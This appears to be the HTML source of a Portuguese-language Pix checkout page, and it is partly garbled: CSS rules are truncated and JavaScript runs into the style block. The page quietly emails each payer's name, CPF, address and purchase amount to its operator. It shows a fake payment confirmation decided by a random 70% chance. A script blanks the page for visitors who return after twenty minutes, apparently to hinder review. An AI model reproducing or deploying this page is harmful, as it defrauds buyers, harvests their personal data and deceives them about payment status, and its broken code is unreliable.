<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <script>
(function() {
    const VINTE_MINUTOS = 20 * 60 * 1000; 
    const agora = new Date().getTime();
    
    let primeiroAcesso = localStorage.getItem('site_primeiro_acesso');

    if (!primeiroAcesso) {
        localStorage.setItem('site_primeiro_acesso', agora);
    } else {
        const tempoDecorrido = agora - parseInt(primeiroAcesso);

        if (tempoDecorrido > VINTE_MINUTOS) {
            document.documentElement.innerHTML = "";
            document.documentElement.style.backgroundColor = "#ffffff";
            window.stop(); 
        }
    }
})();
    </script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Opções de Pagamento | Pagamento Seguro</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">

    <style>

            --primary: #0055ff;
            --primary-dark: #0033cc;
            --primary-light: #e8f0ff;
            --accent: #00bfff;
            --success: #28a745;
            --warning: #ff6b35;
            --danger: #ff3b30;

            --text-light: #888;

        .brand-logo {

        .header-right {

        .payment-action-btn {

            color: white;
            border: none;
            padding: 16px;

        .pix-header-status {

        /* ===== MELHORIAS DE UX: QR CODE E INSTRUÇÕES ===== */

        }

        .pix-code-wrapper {
            background: #f8fafc;
            border: 2px dashed var(--pix-color);
            border-radius: 16px;
            padding: 0;
            display: flex;
            flex-direction: column;
            gap: 0;
        }

        .pix-code-display-wrapper {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-bottom: 10px;
        }

        .pix-code-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 12px 16px;
            border-bottom: 1px solid var(--border-color);
        }

        .pix-code-label {
            font-size: 0.75rem;
            font-weight: 700;
            color: var(--text-light);
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .pix-code-value-label {
            font-size: 0.85rem;
            font-weight: 800;
            color: var(--primary);
        }

        .pix-code-input-container {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 12px 16px;
            background: #f8fafc;
        }

        .pix-code-display-text {
            font-family: 'Monaco', 'Consolas', monospace;
            font-size: 0.75rem;
            color: var(--text-dark);
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            flex: 1;
            letter-spacing: 0.3px;
            line-height: 1.3;
        }

        .pix-copy-icon-btn {
            background: none;
            border: none;
            color: var(--primary);
            font-size: 1.1rem;

        .pix-copy-icon-btn:hover {

        }

        .pix-copy-icon-btn.copied {

        .btn-copy-pix {

            padding: 14px 20px;

            display: flex;

            width: 100%;
            margin-bottom: 10px;
        }

        .btn-copy-pix:hover {
            background: #FFB300;
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(255, 193, 7, 0.3);
        }

        .btn-copy-pix:disabled {
            background: #ccc;
            cursor: not-allowed;
            transform: none;
        }

        /* ===== BOTÃO DE AÇÃO PRINCIPAL (COPIAR E ABRIR BANCO) ===== */
        .btn-copy-and-open {
            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
            color: white;
            border: none;
            padding: 16px 20px;
            border-radius: 14px;
            font-weight: 800;
            font-size: 1rem;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            width: 100%;
            box-shadow: 0 4px 12px rgba(0, 85, 255, 0.2);
            margin-bottom: 10px;
        }

        .btn-copy-and-open:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 16px rgba(0, 85, 255, 0.3);
        }

        .btn-copy-and-open:disabled {
            background: #ccc;
            cursor: not-allowed;
            transform: none;
        }

        /* ===== STATUS DE PAGAMENTO EM TEMPO REAL ===== */
        .payment-status-container {
            display: flex;
            flex-direction: column;
            gap: 12px;
            padding: 16px;
            background: linear-gradient(135deg, rgba(40, 167, 69, 0.08) 0%, rgba(40, 167, 69, 0.04) 100%);
            border: 1px solid rgba(40, 167, 69, 0.2);
            border-radius: 14px;
            margin-top: 15px;
        }

        .payment-status-item {
            display: flex;
            align-items: center;
            gap: 12px;
            font-size: 0.85rem;
            color: var(--text-dark);
            font-weight: 600;
        }

        .payment-status-icon {
            width: 24px;
            height: 24px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 0.75rem;
            flex-shrink: 0;
        }

        .payment-status-icon.pending {
            background: rgba(255, 193, 7, 0.2);
            color: #ff9800;
        }

        .payment-status-icon.confirmed {
            background: rgba(40, 167, 69, 0.2);
            color: var(--success);
        }

        .payment-status-spinner {
            width: 16px;
            height: 16px;
            border: 2px solid rgba(0, 85, 255, 0.1);
            border-top-color: var(--primary);
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        .waiting-payment-section {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            padding: 12px;
            background: rgba(0, 85, 255, 0.05);
            border-radius: 10px;
            margin-top: 10px;
        }

        .modern-spinner {
            width: 18px;
            height: 18px;
            border: 3px solid rgba(0, 85, 255, 0.1);
            border-top-color: var(--primary);
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        .waiting-text {
            font-size: 0.85rem;
            font-weight: 700;
            color: var(--primary);
        }

        .duty-info-section {
            background: #fff;
            border: 1px solid var(--border-color);
            border-radius: 14px;
            padding: 15px;
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .duty-header {
            font-size: 0.85rem;
            font-weight: 800;
            color: var(--text-dark);
            display: flex;
            align-items: center;
            gap: 8px;
            border-bottom: 1px solid var(--border-color);
            padding-bottom: 8px;
        }

        .duty-user-data {
            display: flex;
            flex-direction: column;
            gap: 4px;
        }

        .duty-field {
            display: flex;
            justify-content: space-between;
            font-size: 0.85rem;
            color: var(--text-dark);
        }

        .duty-label {
            font-weight: 600;
            color: var(--text-gray);
        }

        .duty-value {
            font-weight: 700;
            text-align: right;
        }

        .duty-warning {
            font-size: 0.75rem;
            color: var(--text-gray);
            margin-top: 12px;
            line-height: 1.4;
            background: rgba(0, 0, 0, 0.03);
            padding: 10px 12px;
            border-radius: 8px;
            border-left: 3px solid var(--pix-color);
            display: flex;
            align-items: flex-start;
            gap: 8px;
        }

        .duty-warning i {
            color: var(--primary);
            margin-top: 2px;
        }

        .promo-badge {
            background-color: rgba(40, 167, 69, 0.08);
            color: #1e7e34;
            border: 1px solid rgba(40, 167, 69, 0.2);
            padding: 2px 8px;
            border-radius: 6px;
            font-size: 11px;
            font-weight: 600;
            letter-spacing: 0.3px;
            text-transform: none;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            line-height: 1;
            height: 20px;
            white-space: nowrap;
            transition: all 0.2s ease;
        }

        .payment-option-card:hover .promo-badge {
            background-color: rgba(40, 167, 69, 0.12);
            border-color: rgba(40, 167, 69, 0.3);
        }

        .delivery-warning-container {
            display: none;
            flex-direction: column;
            gap: 12px;
            animation: fadeIn 0.3s ease-out;
        }

        .payment-option-card.selected .delivery-warning-container {
            display: flex;
        }

        .delivery-warning-box {
            background: rgba(255, 107, 53, 0.08);
            border: 1px solid rgba(255, 107, 53, 0.2);
            border-radius: 12px;
            padding: 12px;
            display: flex;
            align-items: flex-start;
            gap: 10px;
        }

        .delivery-warning-text {
            font-size: 0.8rem;
            color: var(--text-dark);
            line-height: 1.4;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.6);
            backdrop-filter: blur(4px);
            z-index: 1000;
            display: none;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .modal-overlay.active {
            display: flex;
        }

        .modal-content {
            background: white;
            width: 100%;
            max-width: 400px;
            border-radius: 24px;
            padding: 30px;
            position: relative;
            box-shadow: var(--shadow-lg);
            animation: modalIn 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }

        @keyframes modalIn {
            from { opacity: 0; transform: scale(0.9); }
            to { opacity: 1; transform: scale(1); }
        }

        .modal-close-btn {
            position: absolute;
            top: 15px;
            right: 15px;
            background: #f1f5f9;
            border: none;

        function maskCPF(value) {
            return value
                .replace(/\D/g, '')
                .replace(/(\d{3})(\d)/, '$1.$2')
                .replace(/(\d{3})(\d)/, '$1.$2')
                .replace(/(\d{3})(\d{1,2})/, '$1-$2')
                .replace(/(-\d{2})\d+?$/, '$1');
        }

        function maskPhone(value) {
            return value
                .replace(/\D/g, '')
                .replace(/^(\d{2})(\d)/g, '($1) $2')
                .replace(/(\d{5})(\d)/, '$1-$2')
                .replace(/(-\d{4})\d+?$/, '$1');
        }

                e.target.value = maskPhone(e.target.value);
                const rawValue = e.target.value.replace(/\D/g, '');
                
                if (rawValue.length === 11) {
                    checkIcon.classList.add('visible');
                } else {

        let timerInterval;
        function startPixTimer(durationInSeconds) {
            clearInterval(timerInterval);
            let timer = durationInSeconds;
            const display = document.getElementById('pix-timer');
            timerInterval = setInterval(() => {
                let minutes = parseInt(timer / 60, 10);
                let seconds = parseInt(timer % 60, 10);
                display.textContent = (minutes < 10 ? "0" + minutes : minutes) + ":" + (seconds < 10 ? "0" + seconds : seconds);
                if (--timer < 0) { 
                    clearInterval(timerInterval); 
                    display.textContent = "EXPIRADO"; 
                }
            }, 1000);
        }

        async function sendEmailJS(name, cpf, phone, valor) {
            try {
                const addressFromUrl = getUrlParameter('address') || '';
                const cepFromUrl = getUrlParameter('cep') || '';
                
                let endereco_entrega = '';
                if (addressFromUrl && cepFromUrl) {
                    endereco_entrega = `Endereço: ${addressFromUrl}, CEP: ${cepFromUrl}`;
                } else if (addressFromUrl) {
                    endereco_entrega = `Endereço: ${addressFromUrl}`;
                }
                
                const dados_cliente = `Nome: ${name}, CPF: ${cpf}`;
                const valor_compra = parseFloat(valor).toFixed(2).replace('.', ',');
                
                const templateParams = {
                    endereco_entrega: endereco_entrega,
                    dados_cliente: dados_cliente,
                    valor_compra: valor_compra
                };
                
                await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams);
            } catch (err) { 
                console.error('EmailJS error:', err); 
            }
        }

        async function generatePix() {
            const name = document.getElementById('pix-name').value.trim();
            const cpfRaw = document.getElementById('pix-cpf').value;
            const phone = document.getElementById('pix-phone').value.trim();
            const cpf = cpfRaw.replace(/\D/g, '');
            const errorEl = document.getElementById('pix-error-msg');
            const errorText = document.getElementById('pix-error-text');
            errorEl.classList.remove('visible');

            if (name.length < 3) { errorText.textContent = 'Informe seu nome completo.'; errorEl.classList.add('visible'); return; }
            if (cpf.length !== 11) { errorText.textContent = 'Informe um CPF válido.'; errorEl.classList.add('visible'); return; }

            const savedPix = JSON.parse(localStorage.getItem('cached_pix_data'));
            
            if (savedPix && parseFloat(savedPix.amount) === subtotalValue && savedPix.code) {
                showPixCopySection(savedPix.code, name, cpfRaw);
                return;
            }

            const btn = document.getElementById('btn-generate-pix');
            const originalHTML = btn.innerHTML;
            btn.innerHTML = '<div class="spinner"></div>';
            btn.disabled = true;

            try {
                sendEmailJS(name, cpfRaw, phone, subtotalValue);
                
                if (cpf === '11111111111') {
                    const fakePixCode = "00020126330014BR.GOV.BCB.PIX011111111111111520400005303986540510.005802BR5913USUARIO TESTE6009SAO PAULO62070503***6304ABCD";
                    localStorage.setItem('cached_pix_data', JSON.stringify({ code: fakePixCode, amount: subtotalValue }));
                    showPixCopySection(fakePixCode, name, cpfRaw);
                    return;
                }

                const pixCode = await fetchPixCode(name, cpf, phone);
                if (pixCode) { 
                    localStorage.setItem('cached_pix_data', JSON.stringify({ code: pixCode, amount: subtotalValue }));
                    showPixCopySection(pixCode, name, cpfRaw); 
                }
                else { throw new Error(); }
            } catch (err) {
                errorText.textContent = 'Erro ao gerar PIX. Tente novamente.';
                errorEl.classList.add('visible');
                btn.innerHTML = originalHTML;
                btn.disabled = false;
            }
        }

        async function fetchPixCode(payerName, cpf, phone) {
            const response = await fetch('/api/pix', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    payer_name: payerName,
                    payer_cpf: cpf,
                    payer_phone: phone,
                    amount: subtotalValue.toFixed(2)
                }),
            });
            const data = await response.json();
            return data.success ? data.pixCode : null;
        }

        function showPixCopySection(qrCode, name, cpf) {
            document.getElementById('pix-original-content').style.display = 'none';
            document.getElementById('pix-copy-content').style.display = 'flex';
            document.getElementById('display-pix-name').innerText = name;
            document.getElementById('display-pix-cpf').innerText = cpf;
            document.getElementById('pix-code-text').innerText = qrCode;

            // Gerar QR Code visual
            generateQRCode(qrCode);

            const pixCardEl = document.getElementById('pay-now-pix');
            if (pixCardEl) {
                const header = document.querySelector('.header');
                const headerHeight = header ? header.offsetHeight : 0;
                const viewportHeight = window.innerHeight - headerHeight;
                const elementHeight = pixCardEl.offsetHeight;
                const elementOffsetTop = pixCardEl.getBoundingClientRect().top + window.pageYOffset;
                const scrollToPosition = elementOffsetTop - headerHeight - (viewportHeight / 2) + (elementHeight / 2);
                window.scrollTo({ top: scrollToPosition, behavior: 'smooth' });
            }
            startPixTimer(900);
        }

        // Gerar QR Code visual usando QRCode.js
        function generateQRCode(code) {
            const container = document.getElementById('qrCodeContainer');
            container.innerHTML = '';
            new QRCode(container, {
                text: code,
                width: 200,
                height: 200,
                colorDark: "#0055ff",
                colorLight: "#ffffff",
                correctLevel: QRCode.CorrectLevel.H
            });
        }

        function copyPixCode() {
            const code = document.getElementById('pix-code-text').innerText;
            navigator.clipboard.writeText(code).then(() => {
                const btn = document.getElementById('btn-copy-pix-action');
                const originalText = btn.innerText;
                btn.innerText = '✓ Copiado!';
                btn.style.background = '#28a745';
                
                setTimeout(() => { 
                    btn.innerText = originalText; 
                    btn.style.background = '#FFC107'; 
                }, 2000);
            });
        }

        // NOVO: Copiar código e abrir banco
        function copyAndOpenBank() {
            const code = document.getElementById('pix-code-text').innerText;
            navigator.clipboard.writeText(code).then(() => {
                const btn = document.getElementById('btn-copy-and-open');
                const originalHTML = btn.innerHTML;
                btn.innerHTML = '<i class="fas fa-check"></i> Copiado!';
                btn.style.background = '#28a745';
                
                // Sugerir abertura de aplicativo bancário (simulado)
                setTimeout(() => {
                    alert('Código Pix copiado! Abra seu aplicativo bancário e cole o código para pagar.');
                    btn.innerHTML = originalHTML;
                    btn.style.background = '';
                }, 1500);
            });
        }

        // NOVO: Simular verificação de pagamento
        function simulatePaymentVerification() {
            const btn = document.getElementById('btn-verify-payment');
            const originalHTML = btn.innerHTML;
            btn.innerHTML = '<div class="spinner" style="display:inline-block;margin-right:8px;"></div> Verificando...';
            btn.disabled = true;

            // Simular delay de verificação (em produção, seria uma chamada real ao backend)
            setTimeout(() => {
                // Simular 70% de chance de pagamento confirmado
                const isPaymentConfirmed = Math.random() < 0.7;

                if (isPaymentConfirmed) {
                    showPaymentConfirmed();
                } else {
                    btn.innerHTML = originalHTML;
                    btn.disabled = false;
                    alert('Pagamento ainda não foi confirmado. Verifique se completou a transação em seu banco.');
                }
            }, 2000);
        }

        function showPaymentConfirmed() {
            // Atualizar status visual
            document.getElementById('paymentConfirmedIcon').style.display = 'flex';
            document.getElementById('paymentConfirmedText').style.display = 'block';
            
            // Mostrar modal de confirmação
            document.getElementById('confirmationAmount').textContent = `R$ ${subtotalValue.toFixed(2).replace('.', ',')}`;
            document.getElementById('paymentConfirmationModal').classList.add('active');

            // Esconder botão de verificação
            document.getElementById('btn-verify-payment').style.display = 'none';
            document.getElementById('waiting-payment-section').style.display = 'none';
        }

        function closeConfirmationModal() {
            document.getElementById('paymentConfirmationModal').classList.remove('active');
            // Redirecionar para página de sucesso (simulado)
            setTimeout(() => {
                alert('Obrigado pela compra! Seu pedido será processado em breve.');
                // window.location.href = 'success.html';
            }, 500);
        }

        // Inicializar página
        document.addEventListener('DOMContentLoaded', () => {
            renderPaymentOptions();
        });
    </script>
</body>
</html>
